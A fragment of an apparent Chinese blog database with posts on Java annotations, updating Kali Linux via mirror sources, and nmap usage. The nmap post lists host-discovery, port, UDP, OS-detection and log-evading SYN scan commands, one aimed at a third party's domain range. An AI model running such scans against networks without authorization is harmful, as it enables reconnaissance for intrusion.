class=\"headerlink\" title=\"注解简介\"></a>注解简介</h3><h5 id=\"注解的作用\"><a href=\"#注解的作用\" class=\"headerlink\" title=\"注解的作用:\"></a>注解的作用:</h5><ul>\n<li>不是程序本身,可以对程序做出解释,也能对程序的正确性进行矫正(比如写了@Override就要重写)</li>\n<li>可以被其他程序(比如编译器等)读取</li>\n</ul>\n<h5 id=\"注解的格式\"><a href=\"#注解的格式\" class=\"headerlink\" title=\"注解的格式:\"></a>注解的格式:</h5><p>注解是以”@注解名”在代码中存在的,还可以添加一些参数值,例如:@SuppressWarnings(Value=”unchecked”)</p>\n<h5 id=\"注解在哪里使用\"><a href=\"#注解在哪里使用\" class=\"headerlink\" title=\"注解在哪里使用\"></a>注解在哪里使用</h5><p>可以附加在package,class,method,field等上面,相当于给他们添加了额外的辅助信息,我们可以通过反射机制编程实现对这些元数据的访问</p>\n<h3 id=\"内置注解\"><a href=\"#内置注解\" class=\"headerlink\" title=\"内置注解\"></a>内置注解</h3><h5 id=\"Override\"><a href=\"#Override\" class=\"headerlink\" title=\"@Override\"></a>@Override</h5><p>定义在java.long.Override中,用于修饰方法,表示一个方法声明打算重写</p>\n<h5 id=\"Deprecated\"><a href=\"#Deprecated\" class=\"headerlink\" title=\"@Deprecated\"></a>@Deprecated</h5><p>定义在java.long.Deprecated中,此注释可以用于修饰方法,属性类,表示不鼓励程序员使用这一的元素,通过是一万年它很危险或者存在更好的选择</p>\n<h5 id=\"SuppressWarnings\"><a href=\"#SuppressWarnings\" class=\"headerlink\" title=\"@SuppressWarnings\"></a>@SuppressWarnings</h5><p>定义在java.long.SuppressWarnings中,用来抑制编译时的警告信息,它需要添加一个参数才能使用</p>\n<p>例如:</p>\n<ul>\n<li><p>@SuppressWarnings(“all”)</p>\n</li>\n<li><p>@SuppressWarnings(“unchecked”)</p>\n</li>\n<li><p>@SuppressWarnings(value={“unchecked”,”deprecation”})</p>\n</li>\n</ul>\n<p>能传递多个参数源自于其源码中的最后一行</p>\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220111133538313.png\" alt=\"image-20220111133538313\" style=\"zoom:80%;\" />\n\n<ul>\n<li>…….</li>\n</ul>\n<h3 id=\"元注解\"><a href=\"#元注解\" class=\"headerlink\" title=\"元注解\"></a>元注解</h3><p>元注解的作用就是解释其他注解,java定义了四个标准的元注解(meta_annotation)</p>\n<ul>\n<li>@Target </li>\n</ul>\n<p>用于表示注解的使用范围</p>\n<p>​                              @Target(ElementType.TYPE)   //接口、类、枚举</p>\n<p>　　　　　　　　@Target(ElementType.FIELD) //字段、枚举的常量</p>\n<p>　　　　　　　　@Target(ElementType.METHOD) //方法</p>\n<p>　　　　　　　　@Target(ElementType.PARAMETER) //方法参数</p>\n<p>　　　　　　　　@Target(ElementType.CONSTRUCTOR)  //构造函数</p>\n<p>　　　　　　　　@Target(ElementType.LOCAL_VARIABLE)//局部变量</p>\n<p>　　　　　　　　@Target(ElementType.ANNOTATION_TYPE)//注解</p>\n<p>　　　　　　　　@Target(ElementType.PACKAGE) ///包   </p>\n<ul>\n<li>@Retention</li>\n</ul>\n<p>表示需要在什么级别保存该注释信息,用于描述注解的声明周期</p>\n<p>Runtime&gt;class&gt;source</p>\n<ul>\n<li>@Documented</li>\n</ul>\n<p>说明该注解将被包含在javadoc中</p>\n<ul>\n<li>@Inherited</li>\n</ul>\n<p>说明子类可以继承父类中的该注解</p>\n<h3 id=\"自定义注解\"><a href=\"#自定义注解\" class=\"headerlink\" title=\"自定义注解\"></a>自定义注解</h3><p>使用@interface自定义注解,自动继承java.lang.annotation.Annotation接口</p>\n<ul>\n<li>格式</li>\n</ul>\n<p>public @ interface 注解名 {定义内容}</p>\n<ul>\n<li><p>其中的每一个方法实际上是声明了一个配置参数</p>\n</li>\n<li><p>方法的名称就是参数的名称</p>\n</li>\n<li><p>返回值类型就是参数的类型(返回值只能是Class,String,enum)</p>\n</li>\n<li><p>可以通过default来声明参数的默认值</p>\n</li>\n<li><p>如果只有一个参数成员,一般参数名为value<label style=\"color:red\">(value参数可以省略传参)</label></p>\n</li>\n<li><p>注解元素必须要有值,我们定义注解元素时,经常使用空字符串,0作为默认值</p>\n</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.ElementType;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Retention;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@myAnnotation(Class = &quot;不写默认就是一班二班&quot;)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">method</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">@Target(&#123;ElementType.TYPE, ElementType.METHOD&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class=\"line\"><span class=\"meta\">@interface</span> myAnnotation&#123;</span><br><span class=\"line\">    <span class=\"comment\">//注解的参数:参数类型+参数名();</span></span><br><span class=\"line\">    <span class=\"function\">String <span class=\"title\">name</span><span class=\"params\">()</span> <span class=\"keyword\">default</span> &quot;lol&quot;</span>;<span class=\"comment\">//定义了注解的参数就要传参,也可以通过default定义不传参时默认情况下的参数</span></span><br><span class=\"line\">    String [] Class() <span class=\"keyword\">default</span> &#123;<span class=\"string\">&quot;一班&quot;</span>,<span class=\"string\">&quot;二班&quot;</span>&#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"注解-Annotation\"><a href=\"#注解-Annotation\" class=\"headerlink\" title=\"注解(Annotation)\"></a>注解(Annotation)</h2>","more":"<h3 id=\"注解简介\"><a href=\"#注解简介\" class=\"headerlink\" title=\"注解简介\"></a>注解简介</h3><h5 id=\"注解的作用\"><a href=\"#注解的作用\" class=\"headerlink\" title=\"注解的作用:\"></a>注解的作用:</h5><ul>\n<li>不是程序本身,可以对程序做出解释,也能对程序的正确性进行矫正(比如写了@Override就要重写)</li>\n<li>可以被其他程序(比如编译器等)读取</li>\n</ul>\n<h5 id=\"注解的格式\"><a href=\"#注解的格式\" class=\"headerlink\" title=\"注解的格式:\"></a>注解的格式:</h5><p>注解是以”@注解名”在代码中存在的,还可以添加一些参数值,例如:@SuppressWarnings(Value=”unchecked”)</p>\n<h5 id=\"注解在哪里使用\"><a href=\"#注解在哪里使用\" class=\"headerlink\" title=\"注解在哪里使用\"></a>注解在哪里使用</h5><p>可以附加在package,class,method,field等上面,相当于给他们添加了额外的辅助信息,我们可以通过反射机制编程实现对这些元数据的访问</p>\n<h3 id=\"内置注解\"><a href=\"#内置注解\" class=\"headerlink\" title=\"内置注解\"></a>内置注解</h3><h5 id=\"Override\"><a href=\"#Override\" class=\"headerlink\" title=\"@Override\"></a>@Override</h5><p>定义在java.long.Override中,用于修饰方法,表示一个方法声明打算重写</p>\n<h5 id=\"Deprecated\"><a href=\"#Deprecated\" class=\"headerlink\" title=\"@Deprecated\"></a>@Deprecated</h5><p>定义在java.long.Deprecated中,此注释可以用于修饰方法,属性类,表示不鼓励程序员使用这一的元素,通过是一万年它很危险或者存在更好的选择</p>\n<h5 id=\"SuppressWarnings\"><a href=\"#SuppressWarnings\" class=\"headerlink\" title=\"@SuppressWarnings\"></a>@SuppressWarnings</h5><p>定义在java.long.SuppressWarnings中,用来抑制编译时的警告信息,它需要添加一个参数才能使用</p>\n<p>例如:</p>\n<ul>\n<li><p>@SuppressWarnings(“all”)</p>\n</li>\n<li><p>@SuppressWarnings(“unchecked”)</p>\n</li>\n<li><p>@SuppressWarnings(value={“unchecked”,”deprecation”})</p>\n</li>\n</ul>\n<p>能传递多个参数源自于其源码中的最后一行</p>\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220111133538313.png\" alt=\"image-20220111133538313\" style=\"zoom:80%;\" />\n\n<ul>\n<li>…….</li>\n</ul>\n<h3 id=\"元注解\"><a href=\"#元注解\" class=\"headerlink\" title=\"元注解\"></a>元注解</h3><p>元注解的作用就是解释其他注解,java定义了四个标准的元注解(meta_annotation)</p>\n<ul>\n<li>@Target </li>\n</ul>\n<p>用于表示注解的使用范围</p>\n<p>​                              @Target(ElementType.TYPE)   //接口、类、枚举</p>\n<p>　　　　　　　　@Target(ElementType.FIELD) //字段、枚举的常量</p>\n<p>　　　　　　　　@Target(ElementType.METHOD) //方法</p>\n<p>　　　　　　　　@Target(ElementType.PARAMETER) //方法参数</p>\n<p>　　　　　　　　@Target(ElementType.CONSTRUCTOR)  //构造函数</p>\n<p>　　　　　　　　@Target(ElementType.LOCAL_VARIABLE)//局部变量</p>\n<p>　　　　　　　　@Target(ElementType.ANNOTATION_TYPE)//注解</p>\n<p>　　　　　　　　@Target(ElementType.PACKAGE) ///包   </p>\n<ul>\n<li>@Retention</li>\n</ul>\n<p>表示需要在什么级别保存该注释信息,用于描述注解的声明周期</p>\n<p>Runtime&gt;class&gt;source</p>\n<ul>\n<li>@Documented</li>\n</ul>\n<p>说明该注解将被包含在javadoc中</p>\n<ul>\n<li>@Inherited</li>\n</ul>\n<p>说明子类可以继承父类中的该注解</p>\n<h3 id=\"自定义注解\"><a href=\"#自定义注解\" class=\"headerlink\" title=\"自定义注解\"></a>自定义注解</h3><p>使用@interface自定义注解,自动继承java.lang.annotation.Annotation接口</p>\n<ul>\n<li>格式</li>\n</ul>\n<p>public @ interface 注解名 {定义内容}</p>\n<ul>\n<li><p>其中的每一个方法实际上是声明了一个配置参数</p>\n</li>\n<li><p>方法的名称就是参数的名称</p>\n</li>\n<li><p>返回值类型就是参数的类型(返回值只能是Class,String,enum)</p>\n</li>\n<li><p>可以通过default来声明参数的默认值</p>\n</li>\n<li><p>如果只有一个参数成员,一般参数名为value<label style=\"color:red\">(value参数可以省略传参)</label></p>\n</li>\n<li><p>注解元素必须要有值,我们定义注解元素时,经常使用空字符串,0作为默认值</p>\n</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.ElementType;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Retention;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@myAnnotation(Class = &quot;不写默认就是一班二班&quot;)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">method</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">@Target(&#123;ElementType.TYPE, ElementType.METHOD&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class=\"line\"><span class=\"meta\">@interface</span> myAnnotation&#123;</span><br><span class=\"line\">    <span class=\"comment\">//注解的参数:参数类型+参数名();</span></span><br><span class=\"line\">    <span class=\"function\">String <span class=\"title\">name</span><span class=\"params\">()</span> <span class=\"keyword\">default</span> &quot;lol&quot;</span>;<span class=\"comment\">//定义了注解的参数就要传参,也可以通过default定义不传参时默认情况下的参数</span></span><br><span class=\"line\">    String [] Class() <span class=\"keyword\">default</span> &#123;<span class=\"string\">&quot;一班&quot;</span>,<span class=\"string\">&quot;二班&quot;</span>&#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"kali更新","date":"2021-01-13T10:16:15.000Z","_content":"\nkali更新依次使用即可更新前先更换源/etc/apt/sources.list\n\n- 中科大\n\n```\ndeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\ndeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n```\n\n- 阿里云\n\n```\ndeb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\ndeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n```\n\n- 清华大学\n\n```\ndeb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\ndeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n```\n\napt-get update & apt-get upgrade当出现正在读取软件包列表 . . .完成 ，画面长时间未变动时，回车执行下一条语句（若如正常执行完毕更好）\n\napt-get dist-upgrade在执行即将结束时会有一次选择，选择是否选择安装新的还是维持旧的，输入Y，安装新的。结束后安装完毕，可再一次执行第一条命令，检查是否所有的安装包是否全部安装。\n\napt-get clean此时已经全部安装完毕，执行下面的命令(可复制)可查看新系统版本\n查看系统版本 命令：lsb_release -a\n\n查看内核版本 命令：uname -r\n","source":"_posts/kali更新.md","raw":"---\ntitle: kali更新\ndate: 2021-01-13 18:16:15\ntags:\n      - kail\n      - linux\ncategories: linux\n---\n\nkali更新依次使用即可更新前先更换源/etc/apt/sources.list\n\n- 中科大\n\n```\ndeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\ndeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n```\n\n- 阿里云\n\n```\ndeb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\ndeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n```\n\n- 清华大学\n\n```\ndeb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\ndeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n```\n\napt-get update & apt-get upgrade当出现正在读取软件包列表 . . .完成 ，画面长时间未变动时，回车执行下一条语句（若如正常执行完毕更好）\n\napt-get dist-upgrade在执行即将结束时会有一次选择，选择是否选择安装新的还是维持旧的，输入Y，安装新的。结束后安装完毕，可再一次执行第一条命令，检查是否所有的安装包是否全部安装。\n\napt-get clean此时已经全部安装完毕，执行下面的命令(可复制)可查看新系统版本\n查看系统版本 命令：lsb_release -a\n\n查看内核版本 命令：uname -r\n","slug":"kali更新","published":1,"updated":"2022-01-13T10:19:12.782Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9ms001jgsw94ahg938l","content":"<p>kali更新依次使用即可更新前先更换源/etc/apt/sources.list</p>\n<ul>\n<li>中科大</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class=\"line\">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>阿里云</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>清华大学</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class=\"line\">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>\n\n<p>apt-get update &amp; apt-get upgrade当出现正在读取软件包列表 . . .完成 ，画面长时间未变动时，回车执行下一条语句（若如正常执行完毕更好）</p>\n<p>apt-get dist-upgrade在执行即将结束时会有一次选择，选择是否选择安装新的还是维持旧的，输入Y，安装新的。结束后安装完毕，可再一次执行第一条命令，检查是否所有的安装包是否全部安装。</p>\n<p>apt-get clean此时已经全部安装完毕，执行下面的命令(可复制)可查看新系统版本<br>查看系统版本 命令：lsb_release -a</p>\n<p>查看内核版本 命令：uname -r</p>\n","site":{"data":{}},"excerpt":"","more":"<p>kali更新依次使用即可更新前先更换源/etc/apt/sources.list</p>\n<ul>\n<li>中科大</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class=\"line\">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>阿里云</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>清华大学</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class=\"line\">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>\n\n<p>apt-get update &amp; apt-get upgrade当出现正在读取软件包列表 . . .完成 ，画面长时间未变动时，回车执行下一条语句（若如正常执行完毕更好）</p>\n<p>apt-get dist-upgrade在执行即将结束时会有一次选择，选择是否选择安装新的还是维持旧的，输入Y，安装新的。结束后安装完毕，可再一次执行第一条命令，检查是否所有的安装包是否全部安装。</p>\n<p>apt-get clean此时已经全部安装完毕，执行下面的命令(可复制)可查看新系统版本<br>查看系统版本 命令：lsb_release -a</p>\n<p>查看内核版本 命令：uname -r</p>\n"},{"title":"nmap使用","date":"2021-01-13T10:49:35.000Z","_content":"\n## NMAP\n\nnmap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。<!--more-->\n\n其基本功能有四个：\n\n主机发现（Host Discovery）\n\n端口扫描（Port Scanning）\n\n版本侦测（Version Detection）\n\n操作系统侦测（Operating System Detection）\n\n#### 主机扫描：\n\n1)-sL 列表扫描：可以对主机进行反向域名解析,校验ip或域名是否存在\n\n\n\nnmap -sL 192.168.2.0/24或www.baidu.com/24\n\n\n\n2)-sP ping扫描：使用ping主机，得出可响应的主机列表\n\n\n\nnmap -sP 192.168.2.0/24或www.baidu.com/24\n\n\n\n3)-P0 (无ping):高强度的扫描时用它确定正在运行的机器, 默认情况下，Nmap只对正在运行的主机进行高强度的探测如 端口扫描，版本探测，或者操作系统探测。\n\n\n\nnmap -P0 192.168.8.111\n\n\n\n4)-PS [portlist] (TCP SYN Ping):发送一个设置了SYN标志位的空TCP报文,尝试建立连接,成功返回报文up以及运行信息，失败返回down；\n\n\n\nnmap -PS 192.168.8.118\n\n\n\n5）-PA [portlist] (TCP ACK Ping)：发送一个设置了ACK标志位的空TCP报文,尝试建立连接,成功返回报文up以及运行信息，失败返回down；\n\n\n\nnmap -PA 192.168.8.118\n\n\n\n\\6) -PU [portlist] (UDP Ping):它发送一个空的UDP报文，返回响应报文up以及运行信息，失败返回down；\n\n\n\nnmap -PU 192.168.8.118\n\n\n\n7)-PE; -PP; -PM (ICMP Ping Types):发送一个ICMP type 8 (回声请求)报文到目标IP地址， 期待从运行的主机得到一个type 0 (回声响应)报文。\n\n\n\nnmap -PE 192.168.8.118\n\n\n\n8)-PR (ARP Ping):同一个局域网内，当进行ARP扫描时，Nmap用它优化的算法管理ARP请求。 当它收到响应时， Nmap甚至不需要担心基于IP的ping报文，既然它已经知道该主机正在运行了。 这使得ARP扫描比基于IP的扫描更快更可靠。\n\n\n\nnmap -PR 192.168.2.118\n\n\n\n \n\n\n\n#### 端口扫描 \n\n端口状态：扫描之后，你可能会看到一些端口状态如 open(开放的)，filtered(被过滤的)，closed(关闭的)等等。\n\n\n\n\\- Open(开放的): 应用程序正在这个端口上监听连接。\n\n\\- Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。\n\n\\- Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。\n\n\\- Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。\n\n\\- Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。\n\n\\- Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。\n\n1）-sS (TCP SYN扫描)： 被称为半开放扫描， 因为它不打开一个完全的TCP连接。 SYN/ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。\n\n\n\nnmap -sS 192.168.2.118\n\n2)-sT (TCP connect()扫描):Nmap通过创建connect() 系统调用要求操作系统和目标机以及端口建立连接，而不像其它扫描类型直接发送原始报文。\n\n\n\n3)-sU (UDP扫描):UDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)， 该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的).\n\n\n\n4)-sN; -sF; -sX (TCP Null，FIN，and Xmas扫描):\n\n \n\n\n\n##### nmap端口状态解析:\n\nopen ： 应用程序在该端口接收 TCP 连接或者 UDP 报文。 \n\nclosed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。\n\nfiltered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。\n\nunfiltered ：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。\n\nopen | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。\n\nclosed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的\n\n \n\nping扫描：扫描192.168.0.0/24网段上有哪些主机是存活的；\n\n\n\nnmap -sP 192.168.0.0/24\n\n端口扫描：扫描192.168.0.3这台主机开放了哪些端口；\n\n\n\nnmap -sT 192.168.0.3\n\n隐藏扫描，只在目标主机上留下很少的日志信息：隐藏扫描192.168.0.220\n\n\n\nnmap -sS 192.168.0.127\n\nUDP端口扫描：扫描192.168.0.127开放了哪些UDP端口；\n\n\n\nnmap -sU 192.168.0.127\n\n操作系统识别：\n\n\n\nnmap -sS -O  192.168.0.127\n\n \n\n#### 读取文件自动扫描\n\n\n\n假设我们有list.txt文件，文件的内容是ip列表，一行一个。比如这样：\n\n```\n10.73.31.145\n\n10.73.31.116\n```\n\n我们可以输入这条指令让nmap自动扫描：\n\n`nmap -iL list.txt`\n\n\n\n在nmap运行的时候，如果我们可以像其他编程一样打“断点”，直接按键盘的d键就行了，如果想知道运行的进度可以按下X键\n","source":"_posts/nmap使用.md","raw":"---\ntitle: nmap使用\ndate: 2021-01-13 18:49:35\ntags:\t\n      - nmap\n      - 端口扫描\ncategories: 扫描\n---\n\n## NMAP\n\nnmap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。<!--more-->\n\n其基本功能有四个：\n\n主机发现（Host Discovery）\n\n端口扫描（Port Scanning）\n\n版本侦测（Version Detection）\n\n操作系统侦测（Operating System Detection）\n\n#### 主机扫描：\n\n1)-sL 列表扫描：可以对主机进行反向域名解析,校验ip或域名是否存在\n\n\n\nnmap -sL 192.168.2.0/24或www.baidu.com/24\n\n\n\n2)-sP ping扫描：使用ping主机，得出可响应的主机列表\n\n\n\nnmap -sP 192.168.2.0/24或www.baidu.com/24\n\n\n\n3)-P0 (无ping):高强度的扫描时用它确定正在运行的机器, 默认情况下，Nmap只对正在运行的主机进行高强度的探测如 端口扫描，版本探测，或者操作系统探测。\n\n\n\nnmap -P0 192.168.8.111\n\n\n\n4)-PS [portlist] (TCP SYN Ping):发送一个设置了SYN标志位的空TCP报文,尝试建立连接,成功返回报文up以及运行信息，失败返回down；\n\n\n\nnmap -PS 192.168.8.118\n\n\n\n5）-PA [portlist] (TCP ACK Ping)：发送一个设置了ACK标志位的空TCP报文,尝试建立连接,成功返回报文up以及运行信息，失败返回down；\n\n\n\nnmap -PA 192.168.8.118\n\n\n\n\\6) -PU [portlist] (UDP Ping):它发送一个空的UDP报文，返回响应报文up以及运行信息，失败返回down；\n\n\n\nnmap -PU 192.168.8.118\n\n\n\n7)-PE; -PP; -PM (ICMP Ping Types):发送一个ICMP type 8 (回声请求)报文到目标IP地址， 期待从运行的主机得到一个type 0 (回声响应)报文。\n\n\n\nnmap -PE 192.168.8.118\n\n\n\n8)-PR (ARP Ping):同一个局域网内，当进行ARP扫描时，Nmap用它优化的算法管理ARP请求。 当它收到响应时， Nmap甚至不需要担心基于IP的ping报文，既然它已经知道该主机正在运行了。 这使得ARP扫描比基于IP的扫描更快更可靠。\n\n\n\nnmap -PR 192.168.2.118\n\n\n\n \n\n\n\n#### 端口扫描 \n\n端口状态：扫描之后，你可能会看到一些端口状态如 open(开放的)，filtered(被过滤的)，closed(关闭的)等等。\n\n\n\n\\- Open(开放的): 应用程序正在这个端口上监听连接。\n\n\\- Closed(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。\n\n\\- Filtered(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。\n\n\\- Unfiltered(未被过滤的):端口对探测做出了响应，但是Nmap无法确定它们是关闭还是开放。\n\n\\- Open/Filtered: 端口被过滤或者是开放的，Nmap无法做出判断。\n\n\\- Closed/Filtered: 端口被过滤或者是关闭的，Nmap无法做出判断。\n\n1）-sS (TCP SYN扫描)： 被称为半开放扫描， 因为它不打开一个完全的TCP连接。 SYN/ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。\n\n\n\nnmap -sS 192.168.2.118\n\n2)-sT (TCP connect()扫描):Nmap通过创建connect() 系统调用要求操作系统和目标机以及端口建立连接，而不像其它扫描类型直接发送原始报文。\n\n\n\n3)-sU (UDP扫描):UDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)， 该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的).\n\n\n\n4)-sN; -sF; -sX (TCP Null，FIN，and Xmas扫描):\n\n \n\n\n\n##### nmap端口状态解析:\n\nopen ： 应用程序在该端口接收 TCP 连接或者 UDP 报文。 \n\nclosed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。\n\nfiltered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。\n\nunfiltered ：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。\n\nopen | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。\n\nclosed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的\n\n \n\nping扫描：扫描192.168.0.0/24网段上有哪些主机是存活的；\n\n\n\nnmap -sP 192.168.0.0/24\n\n端口扫描：扫描192.168.0.3这台主机开放了哪些端口；\n\n\n\nnmap -sT 192.168.0.3\n\n隐藏扫描，只在目标主机上留下很少的日志信息：隐藏扫描192.168.0.220\n\n\n\nnmap -sS 192.168.0.127\n\nUDP端口扫描：扫描192.168.0.127开放了哪些UDP端口；\n\n\n\nnmap -sU 192.168.0.127\n\n操作系统识别：\n\n\n\nnmap -sS -O  192.168.0.127\n\n \n\n#### 